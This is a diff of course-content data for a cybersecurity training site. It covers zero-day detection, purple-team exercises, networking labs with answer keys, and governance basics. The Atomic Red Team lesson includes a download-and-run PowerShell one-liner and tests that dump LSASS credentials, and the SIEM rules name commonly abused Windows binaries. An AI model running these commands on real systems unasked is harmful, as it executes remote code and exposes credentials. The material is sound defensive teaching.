+      "Dependency confusion attacks target build systems — use private registries and pin versions",
+      "Response requires rapid asset inventory, containment, and investigation across all affected systems"
+    ],
+  },
+  {
+    id: "12.5",
+    courseId: "soc-analyst-path",
+    title: "Zero-Day & Exploit Detection",
+    content: `
+# Zero-Day & Exploit Detection
+
+Zero-day vulnerabilities are unknown to the vendor and have no patch available. Detecting exploitation of zero-days requires behavioral analysis rather than signature-based detection.
+
+## Zero-Day Lifecycle
+
+\`\`\`
+Discovery → Weaponization → Exploitation → Disclosure → Patch
+    │            │               │              │          │
+ Researcher   Exploit dev    Active attacks  CVE assigned  Vendor fix
+ or attacker   & testing    in the wild     Public aware  Deployment
+
+"Zero-day" = time between exploitation and patch availability
+\`\`\`
+
+## Behavioral Detection Approaches
+
+### Exploit Indicators (Generic)
+\`\`\`
+Common Exploitation Behaviors:
+├── Process anomalies
+│   ├── Office apps spawning cmd.exe/powershell.exe
+│   ├── Browser spawning system utilities
+│   ├── svchost.exe with unusual parent process
+│   └── Processes running from temp/user directories
+├── Memory anomalies
+│   ├── RWX memory regions in legitimate processes
+│   ├── Unbacked memory sections with executable code
+│   ├── Process hollowing indicators
+│   └── Stack pivot detection
+├── File system anomalies
+│   ├── Executable files in temp directories
+│   ├── DLLs in non-standard locations
+│   ├── Suspicious file creation after document open
+│   └── Rapid creation of many files
+└── Network anomalies
+    ├── Beaconing patterns (regular interval callbacks)
+    ├── DNS queries to newly registered domains
+    ├── Connections to known-bad infrastructure
+    └── Data exfiltration patterns
+\`\`\`
+
+### SIEM Detection Rules
+\`\`\`
+RULE: Suspicious Process Chain (Document Exploitation)
+index=sysmon EventCode=1
+  ParentImage IN ("*winword.exe", "*excel.exe", "*powerpnt.exe", "*outlook.exe")
+  Image IN ("*cmd.exe", "*powershell.exe", "*wscript.exe", "*mshta.exe",
+            "*certutil.exe", "*bitsadmin.exe", "*rundll32.exe")
+| alert severity=high title="Potential Document Exploitation"
+
+RULE: Process Running from Suspicious Location
+index=sysmon EventCode=1
+  Image IN ("*\\Temp\\*", "*\\AppData\\Local\\Temp\\*", "*\\Downloads\\*")
+  NOT Image IN (known_legitimate_temp_executables)
+| stats count by Computer, Image, ParentImage, User
+\`\`\`
+
+## Windows Exploit Guard
+
+### Attack Surface Reduction (ASR) Rules
+\`\`\`
+Key ASR Rules for Zero-Day Protection:
+├── Block Office from creating child processes
+├── Block Office from creating executable content
+├── Block JavaScript/VBScript from launching downloads
+├── Block execution of potentially obfuscated scripts
+├── Block Win32 API calls from Office macros
+├── Block untrusted and unsigned processes from USB
+└── Block credential stealing from LSASS
+\`\`\`
+
+### Monitoring ASR Events
+\`\`\`
+# Event ID 1121: ASR rule fired in block mode
+# Event ID 1122: ASR rule fired in audit mode
+
+index=windows source="Microsoft-Windows-Windows Defender" EventCode=1121
+| stats count by RuleName, ProcessName, Path
+| sort -count
+\`\`\`
+
+## Threat Intelligence for Zero-Days
+
+When a zero-day is disclosed:
+\`\`\`
+Immediate Actions:
+1. Check vendor advisory for IOCs
+2. Search SIEM for historical indicators
+3. Apply available mitigations (disable feature, block vector)
+4. Enable enhanced monitoring for exploitation attempts
+5. Update IDS/IPS with available signatures
+6. Brief SOC team on new threat
+
+Ongoing:
+7. Monitor for patch release
+8. Test and deploy patch immediately when available
+9. Re-scan environment for compromise indicators
+10. Update detection rules with new intelligence
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Zero-day detection relies on behavioral analysis — process chains, memory anomalies, beaconing",
+      "Office applications spawning cmd.exe or PowerShell is a top indicator of document exploitation",
+      "Windows ASR rules provide zero-day protection by blocking common exploitation behaviors",
+      "When zero-days are disclosed, immediately search for historical IOCs and apply available mitigations"
+    ],
+  },
+  {
+    id: "12.6",
+    courseId: "soc-analyst-path",
+    title: "Red Team vs Blue Team Exercises",
+    content: `
+# Red Team vs Blue Team Exercises
+
+Purple teaming combines offensive (red) and defensive (blue) techniques to validate detections, identify gaps, and continuously improve SOC capabilities in a collaborative manner.
+
+## Exercise Types
+
+\`\`\`
+Exercise Spectrum:
+├── Tabletop Exercise — Discussion-based, no live systems
+├── Purple Team Exercise — Collaborative attack/defend
+├── Red Team Assessment — Adversary simulation (stealth)
+├── Blue Team Drill — Defense-focused response exercise
+└── Full Simulation — Combined red/blue with realistic scenario
+\`\`\`
+
+## Purple Team Methodology
+
+### Planning Phase
+\`\`\`
+1. Define Objectives
+   - Which MITRE ATT&CK techniques to test?
+   - Which detection rules to validate?
+   - What gaps are we trying to identify?
+   
+2. Select Scenarios
+   - Based on relevant threat actors for your industry
+   - Map to specific ATT&CK techniques
+   - Define success criteria for detection
+   
+3. Prepare Environment
+   - Ensure logging is working properly
+   - Brief the SOC team (or keep it secret for realism)
+   - Set up communication channels
+   - Define safety boundaries and stop conditions
+\`\`\`
+
+### Execution Phase
+\`\`\`
+Technique-by-Technique Testing:
+┌────────────────────────────────────────────┐
+│ Technique: T1059.001 — PowerShell          │
+├────────────────────────────────────────────┤
+│ Red Team Action:                           │
+│   Execute encoded PowerShell download      │
+│   cradle from compromised workstation      │
+│                                            │
+│ Expected Detection:                        │
+│   □ Script Block Logging captures command  │
+│   □ SIEM alert fires within 5 minutes      │
+│   □ EDR blocks or alerts on execution      │
+│                                            │
+│ Actual Result:                             │
+│   ■ Script Block Logging: DETECTED ✓       │
+│   ■ SIEM alert: DETECTED (3 min) ✓         │
+│   □ EDR: NOT DETECTED ✗                    │
+│                                            │
+│ Gap: EDR policy not monitoring encoded     │
+│      PowerShell on workstations            │
+│ Action: Update EDR policy to monitor       │
+│         encoded PowerShell execution       │
+└────────────────────────────────────────────┘
+\`\`\`
+
+## Atomic Red Team
+
+### Using Atomic Tests
+\`\`\`powershell
+# Install Atomic Red Team
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
+
+# Execute specific technique test
+Invoke-AtomicTest T1059.001 -TestNumbers 1  # PowerShell
+Invoke-AtomicTest T1053.005 -TestNumbers 1  # Scheduled Task
+Invoke-AtomicTest T1003.001 -TestNumbers 1  # LSASS Dump
+
+# Cleanup after testing
+Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
+\`\`\`
+
+## Scoring & Reporting
+
+### Detection Scorecard
+\`\`\`
+Technique              | Logged | Alerted | Blocked | Score
+─────────────────────────────────────────────────────────────
+T1059.001 PowerShell   |   ✓    |    ✓    |    ✗    |  2/3
+T1053.005 Sched Task   |   ✓    |    ✗    |    ✗    |  1/3
+T1003.001 LSASS Dump   |   ✓    |    ✓    |    ✓    |  3/3
+T1547.001 Registry Run |   ✓    |    ✓    |    ✗    |  2/3
+T1070.001 Log Clear    |   ✓    |    ✓    |    ✓    |  3/3
+─────────────────────────────────────────────────────────────
+Overall Detection Coverage: 73% (11/15)
+\`\`\`
+
+### Gap Remediation Plan
+\`\`\`
+Priority | Gap | Remediation | Owner | ETA
+─────────────────────────────────────────────────
+High | EDR not blocking encoded PS | Update policy | SOC Lead | 1 week
+High | No alert for sched tasks | Create SIEM rule | Detection Eng | 2 weeks
+Med | Slow alert on PtH | Tune correlation | SIEM Admin | 3 weeks
+Low | No ASR rules deployed | GPO deployment | IT Ops | 1 month
+\`\`\`
+
+## Building a Continuous Program
+
+\`\`\`
+Quarterly Cycle:
+Q1: Test initial access & execution techniques
+Q2: Test persistence & privilege escalation
+Q3: Test lateral movement & credential access
+Q4: Full kill chain simulation + annual report
+
+Monthly: Run automated Atomic tests for regression
+Weekly: Review detection rule health and coverage
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Purple teaming combines red and blue teams for collaborative detection validation",
+      "Test technique by technique, documenting whether each is logged, alerted, and blocked",
+      "Atomic Red Team provides standardized, repeatable tests mapped to MITRE ATT&CK",
+      "Build a continuous testing program with quarterly exercises and monthly automated regression"
+    ],
+  },
+
   // ==========================================
   // NETWORK FUNDAMENTALS COURSE
-  // ==========================================
 
   // Module 1: Introduction to Computer Networks
   {
@@ -29438,6 +33393,43 @@ Combines two or more topologies. Most real-world networks are hybrid:
       "Most enterprise networks use hybrid topologies",
       "Topology choice impacts reliability, cost, and scalability"
     ],
+    practicalExercise: {
+      title: "Network Topology Identification",
+      description: "Identify and compare network topologies based on real-world scenarios.",
+      steps: [
+        "Read the network description carefully",
+        "Identify the topology based on connection patterns",
+        "Consider fault tolerance and cost tradeoffs",
+        "Select the correct topology type"
+      ],
+      labScenario: "You are a junior network engineer reviewing three office setups:\n\nOffice A: All 20 workstations connect to a single central switch. If the switch fails, the entire office loses connectivity.\n\nOffice B: Each workstation connects to exactly two neighbors, forming a closed loop. Traffic can travel in either direction.\n\nOffice C: All devices connect to a shared coaxial cable backbone with terminators at both ends. Adding a new device requires tapping into the cable.",
+      labQuestions: [
+        {
+          id: "nf-1.3-q1",
+          question: "What topology does Office A use?",
+          answer: "star",
+          hint: "All devices connect to one central device — a hub or switch."
+        },
+        {
+          id: "nf-1.3-q2",
+          question: "What topology does Office B use?",
+          answer: "ring",
+          hint: "Devices form a closed loop, each connected to exactly two neighbors."
+        },
+        {
+          id: "nf-1.3-q3",
+          question: "What topology does Office C use?",
+          answer: "bus",
+          hint: "All devices share a single backbone cable with terminators at each end."
+        },
+        {
+          id: "nf-1.3-q4",
+          question: "Which office (A, B, or C) has the highest single point of failure risk?",
+          answer: "A",
+          hint: "Think about what happens when the central device fails."
+        }
+      ]
+    },
   },
   {
     id: "nf-1.4",
@@ -29847,6 +33839,43 @@ Ports identify specific applications/services:
       "UDP provides fast, connectionless communication for latency-sensitive apps",
       "Port numbers identify specific services — memorize well-known ports (0-1023)"
     ],
+    practicalExercise: {
+      title: "OSI Layer Mapping",
+      description: "Map network events and protocols to the correct OSI layer.",
+      steps: [
+        "Review each network event described in the scenario",
+        "Identify which OSI layer handles that function",
+        "Match protocols to their correct layers",
+        "Consider how data is encapsulated at each layer"
+      ],
+      labScenario: "A user opens a browser and visits https://www.example.com. The following events occur in sequence:\n\nEvent 1: The browser encrypts the HTTP request using TLS.\nEvent 2: TCP performs a three-way handshake with the web server on port 443.\nEvent 3: The packet is routed across three networks using IP addresses.\nEvent 4: The data is converted to electrical signals and sent over an Ethernet cable.",
+      labQuestions: [
+        {
+          id: "nf-2.3-q1",
+          question: "Which OSI layer handles TLS encryption (Event 1)? Answer with layer number.",
+          answer: "6",
+          hint: "TLS handles encryption and decryption — this is the Presentation Layer."
+        },
+        {
+          id: "nf-2.3-q2",
+          question: "Which OSI layer handles the TCP three-way handshake (Event 2)? Answer with layer number.",
+          answer: "4",
+          hint: "TCP provides reliable, connection-oriented delivery at the Transport Layer."
+        },
+        {
+          id: "nf-2.3-q3",
+          question: "Which OSI layer handles IP routing (Event 3)? Answer with layer number.",
+          answer: "3",
+          hint: "IP addressing and routing happen at the Network Layer."
+        },
+        {
+          id: "nf-2.3-q4",
+          question: "Which OSI layer converts data to electrical signals (Event 4)? Answer with layer number.",
+          answer: "1",
+          hint: "The Physical Layer handles transmission of raw bits over the medium."
+        }
+      ]
+    },
   },
   {
     id: "nf-2.4",
@@ -30233,6 +34262,37 @@ Client                    Server
       "TCP flags (SYN, ACK, FIN, RST, PSH, URG) control connection state",
       "SYN floods are a common DoS attack exploiting the handshake process"
     ],
+    practicalExercise: {
+      title: "TCP Connection Analysis",
+      description: "Analyze TCP flag sequences to identify normal and suspicious connections.",
+      steps: [
+        "Review the captured packet flags in order",
+        "Identify normal handshake vs abnormal patterns",
+        "Determine the connection state",
+        "Flag any suspicious behavior"
+      ],
+      labScenario: "You capture the following three TCP sessions in Wireshark:\n\nSession 1: SYN → SYN-ACK → ACK → PSH-ACK → FIN-ACK → ACK\nSession 2: SYN → SYN → SYN → SYN → SYN (hundreds of SYN packets from different IPs, no SYN-ACK responses completed)\nSession 3: SYN → RST-ACK (immediate reset from server)",
+      labQuestions: [
+        {
+          id: "nf-3.2-q1",
+          question: "Which session shows a normal, complete TCP connection?",
+          answer: "session 1",
+          hint: "A normal connection completes the three-way handshake and transfers data."
+        },
+        {
+          id: "nf-3.2-q2",
+          question: "What type of attack does Session 2 indicate?",
+          answer: "SYN flood",
+          hint: "Many SYN packets without completing handshakes exhaust server resources."
+        },
+        {
+          id: "nf-3.2-q3",
+          question: "Why did the server send RST-ACK in Session 3?",
+          answer: "port closed",
+          hint: "RST-ACK means the server is refusing the connection — the port isn't listening."
+        }
+      ]
+    },
   },
   {
     id: "nf-3.3",
@@ -30763,6 +34823,43 @@ CIDR  Mask            Hosts   Block
       "To find needed CIDR: calculate minimum host bits where 2^n - 2 ≥ required hosts",
       "Memorize powers of 2 and common CIDR masks for fast calculations"
     ],
+    practicalExercise: {
+      title: "Subnetting Practice",
+      description: "Calculate subnet details from given IP addresses and CIDR notation.",
+      steps: [
+        "Identify the network address from the given IP and CIDR",
+        "Calculate the subnet mask in dotted decimal",
+        "Determine the number of usable hosts",
+        "Find the broadcast address"
+      ],
+      labScenario: "Your company is assigned the network 192.168.10.0/24. The network team needs three subnets:\n\nSubnet A: Engineering department — needs 100 hosts\nSubnet B: Marketing department — needs 50 hosts\nSubnet C: Management — needs 25 hosts\n\nYou need to subnet the /24 network efficiently to accommodate all three departments.",
+      labQuestions: [
+        {
+          id: "nf-4.3-q1",
+          question: "What is the smallest CIDR prefix (e.g., /25) that can accommodate 100 hosts for Subnet A?",
+          answer: "/25",
+          hint: "A /25 gives 128 addresses (126 usable hosts). A /26 only gives 62."
+        },
+        {
+          id: "nf-4.3-q2",
+          question: "What subnet mask in dotted decimal corresponds to /26?",
+          answer: "255.255.255.192",
+          hint: "/26 means 26 bits for network = 255.255.255.192."
+        },
+        {
+          id: "nf-4.3-q3",
+          question: "How many usable host addresses are in a /27 subnet?",
+          answer: "30",
+          hint: "A /27 has 32 total addresses. Subtract 2 (network + broadcast) = 30 usable."
+        },
+        {
+          id: "nf-4.3-q4",
+          question: "What is the broadcast address for the network 192.168.10.0/25?",
+          answer: "192.168.10.127",
+          hint: "/25 covers .0 to .127. The last address is always the broadcast."
+        }
+      ]
+    },
   },
   {
     id: "nf-4.4",
@@ -31179,6 +35276,37 @@ Distribute traffic across multiple servers for availability and performance.
       "Load balancers distribute traffic for availability and performance",
       "WAFs specifically protect web applications from Layer 7 attacks"
     ],
+    practicalExercise: {
+      title: "Firewall Rule Analysis",
+      description: "Evaluate firewall rules to determine which traffic is allowed or blocked.",
+      steps: [
+        "Review each firewall rule in order",
+        "Apply rules top-down as firewalls process them",
+        "Determine the action for each traffic scenario",
+        "Identify any misconfigurations"
+      ],
+      labScenario: "Your firewall has the following rules (processed top to bottom):\n\nRule 1: ALLOW TCP from 10.0.0.0/24 to ANY on port 443\nRule 2: DENY TCP from ANY to 192.168.1.100 on port 22\nRule 3: ALLOW TCP from 10.0.0.5 to 192.168.1.100 on port 22\nRule 4: DENY ALL from ANY to ANY (default deny)",
+      labQuestions: [
+        {
+          id: "nf-5.3-q1",
+          question: "Can host 10.0.0.5 access port 22 on 192.168.1.100?",
+          answer: "no",
+          hint: "Firewall rules are processed top-down. Rule 2 denies ALL sources on port 22 before Rule 3."
+        },
+        {
+          id: "nf-5.3-q2",
+          question: "Can host 10.0.0.15 access an HTTPS website (port 443)?",
+          answer: "yes",
+          hint: "Rule 1 allows all hosts in 10.0.0.0/24 to access port 443 on any destination."
+        },
+        {
+          id: "nf-5.3-q3",
+          question: "What is the problem with Rule 3's placement?",
+          answer: "shadowed by rule 2",
+          hint: "Rule 2 blocks all SSH before Rule 3 can allow it — Rule 3 never triggers."
+        }
+      ]
+    },
   },
   {
     id: "nf-5.4",
@@ -31534,6 +35662,37 @@ DHCP broadcasts don't cross routers. A **DHCP relay agent** forwards DHCP reques
       "DHCP starvation and rogue servers are common attack vectors",
       "DHCP snooping on switches validates DHCP messages for security"
     ],
+    practicalExercise: {
+      title: "DHCP Troubleshooting",
+      description: "Diagnose DHCP issues from network symptoms and logs.",
+      steps: [
+        "Review the symptoms described in each scenario",
+        "Identify which part of DHCP (DORA) is failing",
+        "Determine the likely cause",
+        "Recommend the fix"
+      ],
+      labScenario: "Three support tickets arrive at your IT helpdesk:\n\nTicket 1: A new laptop connects to WiFi but gets a 169.254.x.x address. Other devices on the same network work fine.\n\nTicket 2: Multiple users in Building B suddenly get IP addresses in a different subnet (10.99.0.0/24 instead of 10.10.0.0/24). A new unauthorized device was plugged into the network.\n\nTicket 3: A server with a static IP of 10.10.0.50 goes offline. Investigation shows another device was assigned 10.10.0.50 by DHCP.",
+      labQuestions: [
+        {
+          id: "nf-6.2-q1",
+          question: "What does a 169.254.x.x address in Ticket 1 indicate?",
+          answer: "APIPA",
+          hint: "When DHCP fails, Windows self-assigns an address from 169.254.0.0/16."
+        },
+        {
+          id: "nf-6.2-q2",
+          question: "What attack is occurring in Ticket 2?",
+          answer: "rogue DHCP server",
+          hint: "An unauthorized device is handing out wrong IP configurations."
+        },
+        {
+          id: "nf-6.2-q3",
+          question: "What caused the conflict in Ticket 3?",
+          answer: "IP conflict",
+          hint: "The static IP wasn't excluded from the DHCP scope, causing a duplicate."
+        }
+      ]
+    },
   },
   {
     id: "nf-6.3",
@@ -31995,6 +36154,37 @@ You can identify device manufacturers from the OUI:
       "Standard Ethernet MTU is 1500 bytes; exceeding it causes IP fragmentation",
       "OUI lookup helps identify device manufacturers during network investigations"
     ],
+    practicalExercise: {
+      title: "MAC Address & Ethernet Analysis",
+      description: "Analyze MAC addresses and Ethernet frames to identify devices and issues.",
+      steps: [
+        "Examine the MAC addresses in the scenario",
+        "Use OUI prefixes to identify manufacturers",
+        "Analyze the Ethernet frame details",
+        "Identify anomalies"
+      ],
+      labScenario: "You run 'arp -a' on a workstation and see these entries:\n\n10.0.0.1    00:1A:2B:3C:4D:5E    dynamic\n10.0.0.1    AA:BB:CC:DD:EE:FF    dynamic\n10.0.0.50   00:50:56:AB:CD:EF    dynamic\n10.0.0.51   FF:FF:FF:FF:FF:FF    dynamic\n\nYou notice two different MAC addresses mapped to the same IP (10.0.0.1, the default gateway).",
+      labQuestions: [
+        {
+          id: "nf-7.2-q1",
+          question: "What attack could cause two MAC addresses for the gateway IP 10.0.0.1?",
+          answer: "ARP spoofing",
+          hint: "An attacker sends fake ARP replies to associate their MAC with the gateway IP."
+        },
+        {
+          id: "nf-7.2-q2",
+          question: "What does the MAC prefix 00:50:56 typically indicate (which vendor)?",
+          answer: "VMware",
+          hint: "00:50:56 is a well-known OUI assigned to VMware virtual machines."
+        },
+        {
+          id: "nf-7.2-q3",
+          question: "What is the MAC address FF:FF:FF:FF:FF:FF used for?",
+          answer: "broadcast",
+          hint: "This is the Ethernet broadcast address — frames sent to all devices on the LAN."
+        }
+      ]
+    },
   },
   {
     id: "nf-7.3",
@@ -32308,6 +36498,37 @@ For 5 GHz, many non-overlapping channels are available — less planning needed.
       "WPA3 protects against offline dictionary attacks and provides encrypted open networks",
       "Always disable WPS and use strong passphrases (20+ characters)"
     ],
+    practicalExercise: {
+      title: "Wireless Security Assessment",
+      description: "Evaluate wireless network configurations for security weaknesses.",
+      steps: [
+        "Review each wireless network configuration",
+        "Identify the security protocol used",
+        "Assess vulnerabilities in each setup",
+        "Recommend improvements"
+      ],
+      labScenario: "During a security audit, you scan for nearby wireless networks and find:\n\nNetwork A: SSID 'CorpWiFi' — WPA2-Enterprise with 802.1X, RADIUS authentication, SSID hidden\nNetwork B: SSID 'GuestNet' — WPA2-Personal with password 'welcome123', WPS enabled\nNetwork C: SSID 'OldPrinters' — WEP encryption with a 10-character key\nNetwork D: SSID '' (hidden) — Open network with no encryption",
+      labQuestions: [
+        {
+          id: "nf-8.2-q1",
+          question: "Which network (A, B, C, or D) is most secure?",
+          answer: "A",
+          hint: "WPA2-Enterprise with RADIUS provides the strongest authentication."
+        },
+        {
+          id: "nf-8.2-q2",
+          question: "What is the biggest vulnerability on Network B?",
+          answer: "WPS enabled",
+          hint: "WPS has a known brute-force flaw that can bypass even strong passwords."
+        },
+        {
+          id: "nf-8.2-q3",
+          question: "Why is Network C considered completely insecure?",
+          answer: "WEP is cracked",
+          hint: "WEP encryption can be broken in minutes with freely available tools."
+        }
+      ]
+    },
   },
   {
     id: "nf-8.3",
@@ -32780,6 +37001,37 @@ nbtstat -c                  # Name cache
       "arp -a displays the ARP cache; watch for unexpected MAC address changes",
       "ipconfig /flushdns clears the DNS cache — useful when DNS records change"
     ],
+    practicalExercise: {
+      title: "Network Troubleshooting with CLI Tools",
+      description: "Use command-line output to diagnose network connectivity issues.",
+      steps: [
+        "Review the command outputs provided",
+        "Identify what each output tells you about the problem",
+        "Determine the root cause",
+        "Recommend the correct fix"
+      ],
+      labScenario: "A user reports they cannot access internal websites. You run the following commands:\n\n$ ping 10.0.0.1 → Reply from 10.0.0.1: time=1ms (success)\n$ ping 8.8.8.8 → Request timed out (failure)\n$ ping www.company.com → Could not find host (failure)\n$ netstat -an | grep ':80' → No results\n$ ipconfig → Default Gateway: 10.0.0.1, DNS: 10.0.0.5",
+      labQuestions: [
+        {
+          id: "nf-9.3-q1",
+          question: "The user can ping the gateway but not 8.8.8.8. Where is the problem?",
+          answer: "internet gateway",
+          hint: "Local connectivity works but external traffic fails — the issue is at the gateway or ISP."
+        },
+        {
+          id: "nf-9.3-q2",
+          question: "The ping to www.company.com fails with 'could not find host'. What service is failing?",
+          answer: "DNS",
+          hint: "The system cannot resolve the hostname to an IP — DNS resolution is broken."
+        },
+        {
+          id: "nf-9.3-q3",
+          question: "What does the empty netstat output for port 80 tell you?",
+          answer: "no web server running",
+          hint: "No process is listening on port 80, meaning the web service isn't started."
+        }
+      ]
+    },
   },
   {
     id: "nf-9.4",
@@ -33205,6 +37457,37 @@ Connects entire networks between offices:
       "Split tunneling improves performance but reduces security",
       "Always enforce MFA and kill switches on VPN connections"
     ],
+    practicalExercise: {
+      title: "Protocol Identification",
+      description: "Identify network protocols based on traffic characteristics and port numbers.",
+      steps: [
+        "Examine the traffic capture details",
+        "Match port numbers and behavior to known protocols",
+        "Determine whether the traffic is normal or suspicious",
+        "Classify each connection"
+      ],
+      labScenario: "Your network monitoring tool flags four unusual connections:\n\nConnection 1: 10.0.0.15 → 203.0.113.5 on TCP port 443 — encrypted payload, certificate exchange observed\nConnection 2: 10.0.0.22 → 198.51.100.10 on UDP port 53 — large TXT record responses (500+ bytes each), recurring every 30 seconds\nConnection 3: 10.0.0.30 → 192.168.1.1 on TCP port 23 — plaintext credentials visible in payload\nConnection 4: 10.0.0.8 → 10.0.0.1 on UDP port 67 — DHCP Discover messages",
+      labQuestions: [
+        {
+          id: "nf-10.2-q1",
+          question: "What protocol is Connection 1 using (TCP 443 with certificate exchange)?",
+          answer: "HTTPS",
+          hint: "TCP port 443 with TLS certificate exchange is standard HTTPS traffic."
+        },
+        {
+          id: "nf-10.2-q2",
+          question: "Connection 2 shows large recurring DNS TXT queries. What attack might this indicate?",
+          answer: "DNS tunneling",
+          hint: "Large TXT records at regular intervals often indicate data exfiltration via DNS."
+        },
+        {
+          id: "nf-10.2-q3",
+          question: "What insecure protocol is Connection 3 using on port 23?",
+          answer: "Telnet",
+          hint: "Port 23 with plaintext credentials is Telnet — never use it, use SSH instead."
+        }
+      ]
+    },
   },
   {
     id: "nf-10.3",
@@ -33470,6 +37753,2118 @@ Granular security policies at the workload level:
       "Build a home lab to practice networking concepts hands-on"
     ],
   },
+  // =============================================
+  // CYBERSECURITY FRAMEWORKS COURSE
+  // =============================================
+
+  // Module 1: Introduction to Cybersecurity Governance
+  {
+    id: "cf-1.1",
+    courseId: "cybersecurity-frameworks",
+    title: "What is Cybersecurity Governance?",
+    content: `
+# What is Cybersecurity Governance?
+
+Cybersecurity governance is the system of policies, structures, and processes that ensure an organization's security efforts align with its business goals. It provides the strategic direction for how security is managed, measured, and improved.
+
+## Governance vs. Management
+
+| Aspect | Governance | Management |
+|--------|-----------|------------|
+| Focus | Strategic direction | Day-to-day operations |
+| Responsibility | Board & executives | Security teams |
+| Output | Policies & oversight | Implementation & execution |
+| Timeframe | Long-term | Short-term |
+
+## Why Governance Matters
+
+Without governance, security becomes reactive and fragmented. Governance ensures:
+
+1. **Strategic Alignment** — Security investments support business objectives
+2. **Resource Optimization** — Budgets are allocated based on risk, not fear
+3. **Accountability** — Clear ownership of security decisions and outcomes
+4. **Regulatory Compliance** — Systematic approach to meeting legal obligations
+5. **Risk-Informed Decisions** — Leadership understands cyber risk in business terms
+
+## The Governance Hierarchy
+
+\`\`\`
+┌────────────────────────────────────────┐
+│           Board of Directors           │
+│    (Ultimate accountability for risk)  │
+├────────────────────────────────────────┤
+│          Executive Leadership          │
+│  (CISO, CIO, CRO — strategic direction)│
+├────────────────────────────────────────┤
+│        Security Steering Committee     │
+│  (Cross-functional oversight & review) │
+├────────────────────────────────────────┤
+│          Security Operations           │
+│  (Implementation & daily execution)    │
+└────────────────────────────────────────┘
+\`\`\`
+
+## Key Governance Activities
+
+### 1. Setting Security Strategy
+- Define the organization's risk appetite
+- Establish security objectives tied to business goals
+- Approve the security roadmap and budget
+
+### 2. Policy Development
+- Create enforceable security policies
+- Ensure policies reflect current threat landscape
+- Review and update policies annually
+
+### 3. Risk Oversight
+- Review risk assessments and treatment plans
+- Monitor key risk indicators (KRIs)
+- Approve risk acceptance decisions
+
+### 4. Performance Monitoring
+- Track security metrics and KPIs
+- Review incident trends and response effectiveness
+- Evaluate control maturity over time
+
+## Governance Frameworks
+
+Several frameworks provide guidance for establishing cybersecurity governance:
+
+- **COBIT** — Control Objectives for Information and Related Technology
+- **ITIL** — IT Infrastructure Library (service management)
+- **ISO 38500** — Governance of IT for the organization
+- **NACD Cyber-Risk Oversight Handbook** — Board-level governance guide
+
+## Real-World Impact
+
+Organizations with mature governance programs experience:
+- **53% fewer security breaches** (Ponemon Institute)
+- **Faster incident response** due to clear escalation paths
+- **Better regulatory outcomes** during audits
+- **Increased stakeholder confidence** in security posture
+    `,
+    keyTakeaways: [
+      "Governance provides strategic direction; management handles execution",
+      "The board holds ultimate accountability for cybersecurity risk",
+      "Governance ensures security aligns with business objectives",
+      "Key activities include strategy, policy, risk oversight, and performance monitoring",
+      "Mature governance programs measurably reduce breach frequency"
+    ],
+    additionalResources: [
+      { title: "NACD Director's Handbook on Cyber-Risk Oversight", type: "documentation" },
+      { title: "ISACA COBIT Framework", type: "documentation" },
+    ],
+  },
+  {
+    id: "cf-1.2",
+    courseId: "cybersecurity-frameworks",
+    title: "The GRC Triad: Governance, Risk & Compliance",
+    content: `
+# The GRC Triad: Governance, Risk & Compliance
+
+GRC is the integrated approach to managing governance, risk, and compliance across an organization. These three disciplines are deeply interconnected — weakness in one undermines the others.
+
+## The GRC Relationship
+
+\`\`\`
+         ┌──────────────┐
+         │  GOVERNANCE  │
+         │ (Direction)  │
+         └──────┬───────┘
+                │
+    ┌───────────┴───────────┐
+    │                       │
+┌───┴────────┐      ┌──────┴───────┐
+│    RISK    │◄────►│  COMPLIANCE  │
+│ (Analysis) │      │ (Adherence)  │
+└────────────┘      └──────────────┘
+\`\`\`
+
+## Governance Component
+
+Governance sets the "what" and "why" — the strategic framework within which risk and compliance operate.
+
+**Key Elements:**
+- Security charter and vision
+- Organizational structure for security
+- Decision-making authority and escalation
+- Performance measurement framework
+
+## Risk Management Component
+
+Risk management answers "what could go wrong?" and "what do we do about it?"
+
+**The Risk Lifecycle:**
+1. **Identify** — Catalog assets, threats, and vulnerabilities
+2. **Assess** — Determine likelihood and impact
+3. **Treat** — Mitigate, transfer, avoid, or accept
+4. **Monitor** — Continuously track risk levels
+5. **Report** — Communicate risk posture to stakeholders
+
+### Risk Appetite vs. Risk Tolerance
+
+| Concept | Definition | Example |
+|---------|-----------|---------|
+| Risk Appetite | Overall level of risk an org is willing to accept | "We accept moderate cyber risk to enable innovation" |
+| Risk Tolerance | Acceptable deviation from risk appetite | "Critical systems must have <4hr recovery time" |
+| Risk Capacity | Maximum risk an org can absorb | "A $5M breach would threaten business viability" |
+
+## Compliance Component
+
+Compliance ensures the organization meets external obligations and internal policies.
+
+**Types of Compliance:**
+- **Regulatory** — GDPR, HIPAA, SOX, PCI-DSS
+- **Contractual** — Customer security requirements, SLAs
+- **Industry** — ISO 27001 certification, SOC 2 attestation
+- **Internal** — Adherence to own policies and standards
+
+### Compliance vs. Security
+
+> "You can be compliant and still insecure. Compliance is the floor, not the ceiling."
+
+Compliance provides a baseline, but true security requires going beyond checkbox compliance to address actual risk.
+
+## Integrating GRC
+
+### The Cost of Siloed GRC
+- Duplicated effort across teams
+- Inconsistent risk assessments
+- Gaps in coverage and visibility
+- Audit fatigue from overlapping requirements
+
+### Benefits of Integrated GRC
+- Single source of truth for controls and risks
+- Unified reporting to leadership
+- Efficient use of resources
+- Better decision-making with complete picture
+
+### GRC Technology Platforms
+- **ServiceNow GRC** — Enterprise workflow automation
+- **RSA Archer** — Risk and compliance management
+- **OneTrust** — Privacy and compliance automation
+- **LogicGate** — Flexible risk and compliance workflows
+- **Drata / Vanta** — Continuous compliance monitoring
+    `,
+    keyTakeaways: [
+      "GRC integrates governance, risk management, and compliance into a unified approach",
+      "Governance sets direction; risk analyzes threats; compliance ensures adherence",
+      "Risk appetite defines how much risk an organization willingly accepts",
+      "Compliance is the floor — true security goes beyond regulatory checkboxes",
+      "Integrated GRC reduces duplication and improves decision-making"
+    ],
+    practicalExercise: {
+      title: "GRC Mapping Exercise",
+      description: "Map a real-world scenario to each GRC component and identify how they interact.",
+      steps: [
+        "Choose an industry (healthcare, finance, retail)",
+        "Identify governance structures needed",
+        "List top 5 risks and their treatment strategies",
+        "Map applicable compliance requirements"
+      ]
+    }
+  },
+  {
+    id: "cf-1.3",
+    courseId: "cybersecurity-frameworks",
+    title: "Security Policies, Standards & Procedures",
+    content: `
